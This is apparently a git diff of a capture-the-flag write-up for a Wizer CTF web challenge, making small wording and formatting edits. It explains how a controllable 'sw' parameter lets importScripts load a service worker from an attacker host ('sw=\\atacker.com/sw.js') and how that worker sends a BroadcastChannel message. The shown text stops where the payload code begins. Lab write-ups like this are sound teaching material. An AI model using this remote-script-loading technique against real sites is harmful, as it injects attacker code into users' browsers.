@@ -225,7 +225,7 @@ app.listen(port, () => {
 
 Url: https://events.wizer-ctf.com/
 
-In the webpage there is a `https://events.wizer-ctf.com/app.js` when we analyze it we notice that it will 
+In the webpage there is a `https://events.wizer-ctf.com/app.js`. when we analyse it, we notice that it will 
 Get the "mode" and "color" GET parameters from url and assign it to `modeParam` and `colorParam`
 
 ![image](https://github.com/Aftab700/Writeups/assets/79740895/936de271-6404-49a8-bea8-d31955f758c5)
@@ -243,13 +243,13 @@ Here if we put `modeParam=sw` then we can control the value of `const sw` it wil
 
 `https://events.wizer-ctf.com/sw.js?sw=` have the following code
 
-```
+```js
 // Allow loading in of service workers dynamically
 importScripts('/utils.js');
 importScripts(`/${getParameterByName('sw')}`);
 ```
 
-It will import the serviceWorker from value of `sw` since we can control it we can import our own serviceWorker with `sw=\\atacker.com/sw.js`. \
+It will import the serviceWorker from the value of `sw` since we can control it we can import our own serviceWorker with `sw=\\atacker.com/sw.js`. \
 This will get the file from `https://atacker.com/sw.js`
 
 now to craft our serviceWorker take a look at this
@@ -263,7 +263,8 @@ BroadcastChannel enables communication between different windows, tabs, or worke
 
 so in serviceWorker we create a new BroadcastChannel instance using the same name ('recipebook'): \
 `const channel = new BroadcastChannel('recipebook');` \
-Use the postMessage() method on the BroadcastChannel instance to send a message with a message property: `channel.postMessage({ message: 'Wizer' });`
+Use the postMessage() method on the BroadcastChannel instance to send a message with a message property: \
+`channel.postMessage({ message: 'Wizer' });`
 
 serviceWorker payload:
 ```js
